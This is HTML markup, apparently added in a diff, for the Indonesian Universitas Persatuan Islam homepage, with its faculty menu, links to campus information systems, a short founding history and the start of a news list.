+								<div class='menu-home-container'><ul id='menu-home' class='primary-menu'><li id='menu-item-5039' class='menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-5039'><a href='https://unipi.ac.id/' aria-current='page'>Beranda</a></li>
+<li id='menu-item-5024' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-5024'><a href='#'>Akademik</a>
+<ul class='sub-menu'>
+	<li id='menu-item-5029' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5029'><a href='https://unipi.ac.id/fakultas-keguruan-dan-ilmu-pendidikan/'>Fakultas Keguruan dan Ilmu Pendidikan</a>
+	<ul class='sub-menu'>
+		<li id='menu-item-5025' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5025'><a href='https://unipi.ac.id/s1-pendidikan-bahasa-inggris/'>S1 Pendidikan Bahasa Inggris</a>
+		<ul class='sub-menu'>
+			<li id='menu-item-5071' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5071'><a href='https://drive.google.com/file/d/1WJNiFoFcwjFLspd6SkW9Ukn4Qjk-SWK6/view?usp=sharing'>Sertifikat Akreditasi</a></li>
+		</ul>
+</li>
+		<li id='menu-item-5034' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5034'><a href='https://unipi.ac.id/s1-pendidikan-sejarah/'>S1 Pendidikan Sejarah</a>
+		<ul class='sub-menu'>
+			<li id='menu-item-5077' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5077'><a href='https://drive.google.com/file/d/1pS0d6EntyxJKKAKZiKqzZDzBi1tf2R9Z/view'>Sertifikat Akreditasi</a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+	<li id='menu-item-5030' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5030'><a href='https://unipi.ac.id/fakultas-ilmu-pengetahuan-alam/'>Fakultas Ilmu Pengetahuan Alam</a>
+	<ul class='sub-menu'>
+		<li id='menu-item-5036' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5036'><a href='https://unipi.ac.id/s1-ilmu-lingkungan/'>S1 Ilmu Lingkungan</a>
+		<ul class='sub-menu'>
+			<li id='menu-item-5076' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5076'><a href='https://drive.google.com/file/d/1nKQkZMgk2StbJ9RUtVDNe8_LB77yapVB/view?usp=sharing'>Sertifikat Akreditasi</a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+	<li id='menu-item-5028' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5028'><a href='https://unipi.ac.id/fakultas-bisnis-dan-informatika/'>Fakultas Bisnis dan Informatika</a>
+	<ul class='sub-menu'>
+		<li id='menu-item-5032' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5032'><a href='https://unipi.ac.id/s1-bisnis-digital/'>S1 Bisnis Digital</a>
+		<ul class='sub-menu'>
+			<li id='menu-item-5075' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5075'><a href='https://drive.google.com/file/d/1wV2K74b40JlffPafhP-qaveBbnWMCQ9P/view?usp='>Sertifikat Akreditasi</a></li>
+		</ul>
+</li>
+		<li id='menu-item-5033' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5033'><a href='https://unipi.ac.id/s1-pariwisata/'>S1 Pariwisata</a>
+		<ul class='sub-menu'>
+			<li id='menu-item-5074' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5074'><a href='https://drive.google.com/file/d/1C2z1wdmu8DLLgvp9nByzwldFvlJE8Xin/view?usp=sharing'>Sertifikat Akreditasi</a></li>
+		</ul>
+</li>
+		<li id='menu-item-5064' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-5064'><a href='https://unipi.ac.id/s1-bisnis-digital-duplicate-4207/'>S1 Informatika</a>
+		<ul class='sub-menu'>
+			<li id='menu-item-5073' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5073'><a href='https://drive.google.com/file/d/13HMB_qCQz1goCB3xvX07ru7Nq8JTHCDO/view?usp=sharing'>Sertifikat Akreditasi</a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+	<li id='menu-item-5031' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5031'><a href='https://unipi.ac.id/fakultas-peternakan/'>Fakultas Peternakan</a>
+	<ul class='sub-menu'>
+		<li id='menu-item-5035' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-5035'><a href='https://unipi.ac.id/s1-peternakan/'>S1 Peternakan</a>
+		<ul class='sub-menu'>
+			<li id='menu-item-5072' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5072'><a href='https://drive.google.com/file/d/1DEua-y8sZwx9l6CYHJi4m97yFeuvJoc2/view?usp=sharing'>Sertifikat Akreditasi</a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+</ul>
+</li>
+<li id='menu-item-5041' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-5041'><a href='#'>Tentang Kami</a>
+<ul class='sub-menu'>
+	<li id='menu-item-5120' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5120'><a href='https://unipi.ac.id/struktur-universitas/'>Struktur</a></li>
+	<li id='menu-item-5121' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5121'><a href='https://unipi.ac.id/visi-misi/'>Visi dan Misi</a></li>
+	<li id='menu-item-5122' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5122'><a href='https://unipi.ac.id/sejarah/'>Sejarah</a></li>
+</ul>
+</li>
+<li id='menu-item-5040' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-5040'><a href='#'>Lembaga</a>
+<ul class='sub-menu'>
+	<li id='menu-item-5026' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-5026'><a href='https://unipi.ac.id/lpm/'>LPM</a></li>
+	<li id='menu-item-5027' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-5027'><a href='https://unipi.ac.id/lppm/'>LPPM</a></li>
+	<li id='menu-item-5038' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-5038'><a href='https://unipi.ac.id/dosen/'>Dosen</a></li>
+</ul>
+</li>
+<li id='menu-item-5173' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-5173'><a href='#'>Beasiswa</a>
+<ul class='sub-menu'>
+	<li id='menu-item-5174' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5174'><a href='https://beasiswa-jfl.jabarprov.go.id/'>Beasisw JFLS</a></li>
+	<li id='menu-item-5175' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5175'><a href='https://kip-kuliah.kemdikbud.go.id/'>Beasiswa KIP</a></li>
+</ul>
+</li>
+<li id='menu-item-5042' class='menu-item menu-item-type-custom menu-item-object-custom menu-item-5042'><a href='https://pmb.unipi.ac.id/?_ga=2.75560405.1175312613.1707710167-1553301465.1695456967'>Penerimaan Mahasiswa Baru</a></li>
+</ul></div>							</nav><!-- .main-navigation -->
+						
+											</div><!-- .site-header-menu -->
+							</div><!-- .site-header-main -->
+		</header><!-- .site-header -->
+	<div class='site-inner'>
+		
+		<a class='skip-link screen-reader-text' href='#content'>Skip to content</a>			
+
+		<div id='content' class='site-content'>
+			
+		<div data-elementor-type='wp-page' data-elementor-id='3124' class='elementor elementor-3124'>
+						<section class='elementor-section elementor-top-section elementor-element elementor-element-a30aca0 elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='a30aca0' data-element_type='section'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-e65a6cf' data-id='e65a6cf' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+							</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-4e4799f elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='4e4799f' data-element_type='section'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-b1008d5' data-id='b1008d5' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-1ee3e9c elementor-widget elementor-widget-heading' data-id='1ee3e9c' data-element_type='widget' data-widget_type='heading.default'>
+				<div class='elementor-widget-container'>
+					<h1 class='elementor-heading-title elementor-size-xl'>Sistem Informasi Akademik</h1>				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-78ac4b5 elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='78ac4b5' data-element_type='section'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-56819b9' data-id='56819b9' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-67b89bc animated-slow elementor-position-top elementor-invisible elementor-widget elementor-widget-image-box' data-id='67b89bc' data-element_type='widget' data-settings='{&quot;_animation&quot;:&quot;rubberBand&quot;}' data-widget_type='image-box.default'>
+				<div class='elementor-widget-container'>
+					<div class='elementor-image-box-wrapper'><figure class='elementor-image-box-img'><a href='https://siak.unipi.ac.id' target='_blank' tabindex='-1'><img fetchpriority='high' decoding='async' width='454' height='454' src='https://unipi.ac.id/wp-content/uploads/2022/12/SIAKAD.png' class='attachment-full size-full wp-image-3991' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2022/12/SIAKAD.png 454w, https://unipi.ac.id/wp-content/uploads/2022/12/SIAKAD-300x300.png 300w, https://unipi.ac.id/wp-content/uploads/2022/12/SIAKAD-150x150.png 150w' sizes='(max-width: 454px) 85vw, 454px' /></a></figure><div class='elementor-image-box-content'><h1 class='elementor-image-box-title'><a href='https://siak.unipi.ac.id' target='_blank'>SIAKAD</a></h1><p class='elementor-image-box-description'>Sistem Informasi Akademik</p></div></div>				</div>
+				</div>
+					</div>
+		</div>
+				<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-cce07d1' data-id='cce07d1' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-74da97b elementor-position-top elementor-invisible elementor-widget elementor-widget-image-box' data-id='74da97b' data-element_type='widget' data-settings='{&quot;_animation&quot;:&quot;rubberBand&quot;}' data-widget_type='image-box.default'>
+				<div class='elementor-widget-container'>
+					<div class='elementor-image-box-wrapper'><figure class='elementor-image-box-img'><a href='https://pmb.unipi.ac.id/' target='_blank' tabindex='-1'><img decoding='async' width='415' height='484' src='https://unipi.ac.id/wp-content/uploads/2022/12/PMB.png' class='attachment-full size-full wp-image-3988' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2022/12/PMB.png 415w, https://unipi.ac.id/wp-content/uploads/2022/12/PMB-257x300.png 257w' sizes='(max-width: 415px) 85vw, 415px' /></a></figure><div class='elementor-image-box-content'><h1 class='elementor-image-box-title'><a href='https://pmb.unipi.ac.id/' target='_blank'>PMB</a></h1><p class='elementor-image-box-description'>Sistem Informasi Penerimaan Mahasiswa Baru</p></div></div>				</div>
+				</div>
+					</div>
+		</div>
+				<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-8fdbea2' data-id='8fdbea2' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-cc81fe8 elementor-position-top elementor-invisible elementor-widget elementor-widget-image-box' data-id='cc81fe8' data-element_type='widget' data-settings='{&quot;_animation&quot;:&quot;rubberBand&quot;}' data-widget_type='image-box.default'>
+				<div class='elementor-widget-container'>
+					<div class='elementor-image-box-wrapper'><figure class='elementor-image-box-img'><a href='https://perpustakaan.unipi.ac.id/' target='_blank' tabindex='-1'><img loading='lazy' decoding='async' width='462' height='462' src='https://unipi.ac.id/wp-content/uploads/2022/12/PERPUSTAKAAN.png' class='attachment-full size-full wp-image-3987' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2022/12/PERPUSTAKAAN.png 462w, https://unipi.ac.id/wp-content/uploads/2022/12/PERPUSTAKAAN-300x300.png 300w, https://unipi.ac.id/wp-content/uploads/2022/12/PERPUSTAKAAN-150x150.png 150w' sizes='(max-width: 462px) 85vw, 462px' /></a></figure><div class='elementor-image-box-content'><h1 class='elementor-image-box-title'><a href='https://perpustakaan.unipi.ac.id/' target='_blank'>PERPUSTAKAAN</a></h1><p class='elementor-image-box-description'>Sistem Informasi Perpustakaan </p></div></div>				</div>
+				</div>
+					</div>
+		</div>
+				<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-c99a0bc' data-id='c99a0bc' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-9c43471 elementor-position-top elementor-invisible elementor-widget elementor-widget-image-box' data-id='9c43471' data-element_type='widget' data-settings='{&quot;_animation&quot;:&quot;rubberBand&quot;}' data-widget_type='image-box.default'>
+				<div class='elementor-widget-container'>
+					<div class='elementor-image-box-wrapper'><figure class='elementor-image-box-img'><a href='https://sdm.unipi.ac.id/' target='_blank' tabindex='-1'><img loading='lazy' decoding='async' width='414' height='414' src='https://unipi.ac.id/wp-content/uploads/2022/12/SDM.png' class='attachment-full size-full wp-image-3990' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2022/12/SDM.png 414w, https://unipi.ac.id/wp-content/uploads/2022/12/SDM-300x300.png 300w, https://unipi.ac.id/wp-content/uploads/2022/12/SDM-150x150.png 150w' sizes='(max-width: 414px) 85vw, 414px' /></a></figure><div class='elementor-image-box-content'><h1 class='elementor-image-box-title'><a href='https://sdm.unipi.ac.id/' target='_blank'>SDM</a></h1><p class='elementor-image-box-description'>Sistem Informasi Sumber Daya Manusia</p></div></div>				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-4c897a4 elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='4c897a4' data-element_type='section'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-f4f343a' data-id='f4f343a' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-7f3b21d elementor-position-top elementor-invisible elementor-widget elementor-widget-image-box' data-id='7f3b21d' data-element_type='widget' data-settings='{&quot;_animation&quot;:&quot;rubberBand&quot;}' data-widget_type='image-box.default'>
+				<div class='elementor-widget-container'>
+					<div class='elementor-image-box-wrapper'><figure class='elementor-image-box-img'><a href='https://arsip.unipi.ac.id/' target='_blank' tabindex='-1'><img loading='lazy' decoding='async' width='452' height='451' src='https://unipi.ac.id/wp-content/uploads/2022/12/ARSIP.png' class='attachment-full size-full wp-image-3984' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2022/12/ARSIP.png 452w, https://unipi.ac.id/wp-content/uploads/2022/12/ARSIP-300x300.png 300w, https://unipi.ac.id/wp-content/uploads/2022/12/ARSIP-150x150.png 150w' sizes='(max-width: 452px) 85vw, 452px' /></a></figure><div class='elementor-image-box-content'><h1 class='elementor-image-box-title'><a href='https://arsip.unipi.ac.id/' target='_blank'>ARSIP</a></h1><p class='elementor-image-box-description'>Sistem Informasi Arsip .</p></div></div>				</div>
+				</div>
+					</div>
+		</div>
+				<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-1b5edb4' data-id='1b5edb4' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-4855236 elementor-position-top elementor-invisible elementor-widget elementor-widget-image-box' data-id='4855236' data-element_type='widget' data-settings='{&quot;_animation&quot;:&quot;rubberBand&quot;}' data-widget_type='image-box.default'>
+				<div class='elementor-widget-container'>
+					<div class='elementor-image-box-wrapper'><figure class='elementor-image-box-img'><a href='https://repository.unipi.ac.id/' target='_blank' tabindex='-1'><img loading='lazy' decoding='async' width='334' height='476' src='https://unipi.ac.id/wp-content/uploads/2022/12/REPOSITORY.png' class='attachment-full size-full wp-image-3989' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2022/12/REPOSITORY.png 334w, https://unipi.ac.id/wp-content/uploads/2022/12/REPOSITORY-211x300.png 211w' sizes='(max-width: 334px) 85vw, 334px' /></a></figure><div class='elementor-image-box-content'><h1 class='elementor-image-box-title'><a href='https://repository.unipi.ac.id/' target='_blank'>REPOSITORY</a></h1><p class='elementor-image-box-description'>Sistem Informasi Repository.</p></div></div>				</div>
+				</div>
+					</div>
+		</div>
+				<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-138b8df' data-id='138b8df' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-a57b612 elementor-position-top elementor-invisible elementor-widget elementor-widget-image-box' data-id='a57b612' data-element_type='widget' data-settings='{&quot;_animation&quot;:&quot;rubberBand&quot;}' data-widget_type='image-box.default'>
+				<div class='elementor-widget-container'>
+					<div class='elementor-image-box-wrapper'><figure class='elementor-image-box-img'><a href='https://jurnal.unipi.ac.id/' target='_blank' tabindex='-1'><img loading='lazy' decoding='async' width='452' height='451' src='https://unipi.ac.id/wp-content/uploads/2022/12/ARSIP.png' class='attachment-full size-full wp-image-3984' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2022/12/ARSIP.png 452w, https://unipi.ac.id/wp-content/uploads/2022/12/ARSIP-300x300.png 300w, https://unipi.ac.id/wp-content/uploads/2022/12/ARSIP-150x150.png 150w' sizes='(max-width: 452px) 85vw, 452px' /></a></figure><div class='elementor-image-box-content'><h1 class='elementor-image-box-title'><a href='https://jurnal.unipi.ac.id/' target='_blank'>JURNAL</a></h1><p class='elementor-image-box-description'>Jurnal </p></div></div>				</div>
+				</div>
+					</div>
+		</div>
+				<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-81bd0b1' data-id='81bd0b1' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-1a1cebe elementor-position-top elementor-invisible elementor-widget elementor-widget-image-box' data-id='1a1cebe' data-element_type='widget' data-settings='{&quot;_animation&quot;:&quot;rubberBand&quot;}' data-widget_type='image-box.default'>
+				<div class='elementor-widget-container'>
+					<div class='elementor-image-box-wrapper'><figure class='elementor-image-box-img'><a href='https://inventaris.unipi.ac.id/' target='_blank' tabindex='-1'><img loading='lazy' decoding='async' width='378' height='476' src='https://unipi.ac.id/wp-content/uploads/2022/12/INVENTARISIR.png' class='attachment-full size-full wp-image-3985' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2022/12/INVENTARISIR.png 378w, https://unipi.ac.id/wp-content/uploads/2022/12/INVENTARISIR-238x300.png 238w' sizes='(max-width: 378px) 85vw, 378px' /></a></figure><div class='elementor-image-box-content'><h1 class='elementor-image-box-title'><a href='https://inventaris.unipi.ac.id/' target='_blank'>INVENTARIS</a></h1><p class='elementor-image-box-description'>Sistem Informasi Inventaris</p></div></div>				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-5c0dc1be elementor-section-content-middle elementor-section-stretched elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='5c0dc1be' data-element_type='section' data-settings='{&quot;stretch_section&quot;:&quot;section-stretched&quot;}'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-6521a592' data-id='6521a592' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-79dff55a elementor-widget elementor-widget-heading' data-id='79dff55a' data-element_type='widget' data-settings='{&quot;_animation_mobile&quot;:&quot;none&quot;}' data-widget_type='heading.default'>
+				<div class='elementor-widget-container'>
+					<h3 class='elementor-heading-title elementor-size-default'>UNIVERSITAS PERSATUAN ISLAM</h3>				</div>
+				</div>
+				<div class='elementor-element elementor-element-f0d363a elementor-widget elementor-widget-heading' data-id='f0d363a' data-element_type='widget' data-widget_type='heading.default'>
+				<div class='elementor-widget-container'>
+					<h1 class='elementor-heading-title elementor-size-default'>Selamat Datang di UNIPI</h1>				</div>
+				</div>
+				<div class='elementor-element elementor-element-1e51944e elementor-widget elementor-widget-text-editor' data-id='1e51944e' data-element_type='widget' data-widget_type='text-editor.default'>
+				<div class='elementor-widget-container'>
+									<p>Sebagai salah satu Organisasi Islam yang concern dalam bidang Tarbiyah, Jam’iyah Persatuan Islam membuka lembaran baru dengan mendirikan Perguruan Tinggi berbentuk Universitas. Cita-cita yang selalu menjadi rekomendasi dari Muktamar ke Muktamar, terjawab sudah di penghujung tahun 2018 kemarin. Melalui SK Kemenristekdikti Republik Indonesia Nomor 1271/KPT/1/2018 tanggal 31 Desember 2018 tentang izin perubahan bentuk STKIP Persatuan Islam menjadi Universitas Persatuan Islam.</p>								</div>
+				</div>
+				<div class='elementor-element elementor-element-21d9965 elementor-widget elementor-widget-premium-addon-button' data-id='21d9965' data-element_type='widget' data-widget_type='premium-addon-button.default'>
+				<div class='elementor-widget-container'>
+					
+
+		<a class='premium-button premium-button-style1 premium-btn-lg premium-button-style1-top' href='https://unipi.ac.id/sejarah/'>
+			<div class='premium-button-text-icon-wrapper'>
+				
+									<span >
+						LEBIH LANJUT					</span>
+				
+							</div>
+
+			
+			
+			
+		</a>
+
+
+						</div>
+				</div>
+					</div>
+		</div>
+				<div class='elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-4a3d4a4e' data-id='4a3d4a4e' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-796e523a elementor-widget elementor-widget-image' data-id='796e523a' data-element_type='widget' data-widget_type='image.default'>
+				<div class='elementor-widget-container'>
+															<img loading='lazy' decoding='async' width='550' height='400' src='https://unipi.ac.id/wp-content/uploads/2022/03/pariwisata-defaultimg.jpg' class='attachment-large size-large wp-image-3684' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2022/03/pariwisata-defaultimg.jpg 550w, https://unipi.ac.id/wp-content/uploads/2022/03/pariwisata-defaultimg-300x218.jpg 300w' sizes='(max-width: 550px) 85vw, 550px' />															</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-0e17d87 elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='0e17d87' data-element_type='section'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-6d78b27' data-id='6d78b27' data-element_type='column'>
+			<div class='elementor-widget-wrap'>
+							</div>
+		</div>
+				<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-471eb44' data-id='471eb44' data-element_type='column'>
+			<div class='elementor-widget-wrap'>
+							</div>
+		</div>
+				<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-07a6014' data-id='07a6014' data-element_type='column'>
+			<div class='elementor-widget-wrap'>
+							</div>
+		</div>
+				<div class='elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-e5dbdd9' data-id='e5dbdd9' data-element_type='column'>
+			<div class='elementor-widget-wrap'>
+							</div>
+		</div>
+					</div>
+		</section>
+				<section class='elementor-section elementor-top-section elementor-element elementor-element-2b74e7e elementor-section-stretched elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='2b74e7e' data-element_type='section' data-settings='{&quot;stretch_section&quot;:&quot;section-stretched&quot;,&quot;background_background&quot;:&quot;classic&quot;}'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-fd4a448' data-id='fd4a448' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<section class='elementor-section elementor-inner-section elementor-element elementor-element-4b38d49 elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default' data-id='4b38d49' data-element_type='section'>
+						<div class='elementor-container elementor-column-gap-default'>
+					<div class='elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-40f4362' data-id='40f4362' data-element_type='column'>
+			<div class='elementor-widget-wrap elementor-element-populated'>
+						<div class='elementor-element elementor-element-3519b2a premium-header-inline elementor-widget elementor-widget-premium-addon-dual-header' data-id='3519b2a' data-element_type='widget' data-widget_type='premium-addon-dual-header.default'>
+				<div class='elementor-widget-container'>
+					
+					<h2 class='premium-dual-header-first-header '><span class='premium-dual-header-first-span'>BERITA </span><span class='premium-dual-header-second-header premium-dual-header-second-clip stroke'>TERBARU</span></h2> 		
+						</div>
+				</div>
+				<div class='elementor-element elementor-element-bbd0c55 elementor-widget elementor-widget-text-editor' data-id='bbd0c55' data-element_type='widget' data-settings='{&quot;_animation_mobile&quot;:&quot;none&quot;}' data-widget_type='text-editor.default'>
+				<div class='elementor-widget-container'>
+									<p><span style='color: #333333;'>Kabar Terbaru Tentang Universitas Persatuan Islam (UNIPI)</span></p>								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<div class='elementor-element elementor-element-1a676d9 premium-blog-align-left elementor-widget elementor-widget-premium-addon-blog' data-id='1a676d9' data-element_type='widget' data-settings='{&quot;premium_blog_grid&quot;:&quot;yes&quot;,&quot;premium_blog_layout&quot;:&quot;even&quot;,&quot;premium_blog_columns_number&quot;:&quot;50%&quot;,&quot;premium_blog_columns_number_tablet&quot;:&quot;50%&quot;,&quot;premium_blog_columns_number_mobile&quot;:&quot;100%&quot;}' data-widget_type='premium-addon-blog.default'>
+				<div class='elementor-widget-container'>
+					
+				<div class='premium-blog-wrap  premium-blog-even' data-page='3124'>
+					<div class='premium-blog-post-outer-container' data-total='7'>
+			<div class='premium-blog-post-container premium-blog-skin-classic'>
+									<div class='premium-blog-thumb-effect-wrapper'>
+						<div class='premium-blog-thumbnail-container premium-blog-zoomin-effect'>
+							<img loading='lazy' decoding='async' width='1600' height='1200' src='https://unipi.ac.id/wp-content/uploads/2025/01/WhatsApp-Image-2025-01-13-at-12.22.38.jpeg' class='attachment-full size-full wp-image-5324' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2025/01/WhatsApp-Image-2025-01-13-at-12.22.38.jpeg 1600w, https://unipi.ac.id/wp-content/uploads/2025/01/WhatsApp-Image-2025-01-13-at-12.22.38-300x225.jpeg 300w, https://unipi.ac.id/wp-content/uploads/2025/01/WhatsApp-Image-2025-01-13-at-12.22.38-1024x768.jpeg 1024w, https://unipi.ac.id/wp-content/uploads/2025/01/WhatsApp-Image-2025-01-13-at-12.22.38-768x576.jpeg 768w, https://unipi.ac.id/wp-content/uploads/2025/01/WhatsApp-Image-2025-01-13-at-12.22.38-1536x1152.jpeg 1536w, https://unipi.ac.id/wp-content/uploads/2025/01/WhatsApp-Image-2025-01-13-at-12.22.38-1200x900.jpeg 1200w' sizes='(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px' />						</div>
+													<div class='premium-blog-thumbnail-overlay'>
+								<a class='elementor-icon' href='https://unipi.ac.id/prodi-ilmu-lingkungan-universitas-persatuan-islam-gelar-seminar-dan-praktek-lapangan-di-batu-kuda-manglayang/' target='_self' aria-hidden='true'><span>Prodi Ilmu Lingkungan Universitas Persatuan Islam Gelar Seminar dan Praktek Lapangan di Batu Kuda Manglayang</span></a>
+							</div>
+
+																		</div>
+												<div class='premium-blog-content-wrapper '>
+
+					<div class='premium-blog-inner-container'>
+
+														<h2 class='premium-blog-entry-title'>
+			<a href='https://unipi.ac.id/prodi-ilmu-lingkungan-universitas-persatuan-islam-gelar-seminar-dan-praktek-lapangan-di-batu-kuda-manglayang/' target='_self'>
+				Prodi Ilmu Lingkungan Universitas Persatuan Islam Gelar Seminar dan Praktek Lapangan di Batu Kuda Manglayang			</a>
+		</h2>
+				<div class='premium-blog-entry-meta'>
+			
+			
+			
+					</div>
+		
+					</div>
+
+							<div class='premium-blog-content-inner-wrapper'>
+		<p class='premium-blog-post-content'>menyelenggarakan kegiatan seminar dan praktek lapangan di kawasan Bumi Perkemahan Batu Kuda Manglayang Program Studi Ilmu Lingkungan, Fakultas Ilmu Pengetahuan Alam, Universitas Persatuan Islam baru …</p>		</div>
+							
+				</div>
+			</div>
+		</div>
+
+				<div class='premium-blog-post-outer-container' data-total='7'>
+			<div class='premium-blog-post-container premium-blog-skin-classic'>
+									<div class='premium-blog-thumb-effect-wrapper'>
+						<div class='premium-blog-thumbnail-container premium-blog-zoomin-effect'>
+							<img loading='lazy' decoding='async' width='1080' height='1349' src='https://unipi.ac.id/wp-content/uploads/2024/11/Selamat-dan-sukses-1.jpg' class='attachment-full size-full wp-image-5288' alt='' srcset='https://unipi.ac.id/wp-content/uploads/2024/11/Selamat-dan-sukses-1.jpg 1080w, https://unipi.ac.id/wp-content/uploads/2024/11/Selamat-dan-sukses-1-240x300.jpg 240w, https://unipi.ac.id/wp-content/uploads/2024/11/Selamat-dan-sukses-1-820x1024.jpg 820w, https://unipi.ac.id/wp-content/uploads/2024/11/Selamat-dan-sukses-1-768x959.jpg 768w' sizes='(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px' />						</div>
+													<div class='premium-blog-thumbnail-overlay'>
+								<a class='elementor-icon' href='https://unipi.ac.id/unipipressisbnnewregulation/' target='_self' aria-hidden='true'><span>Unipi Press Universitas Persatuan Islam merespon Peraturan Baru Pengurusan ISBN Buku yang Harus Dilakukan Secara Online</span></a>
+							</div>
+
+																		</div>
+												<div class='premium-blog-content-wrapper '>
+
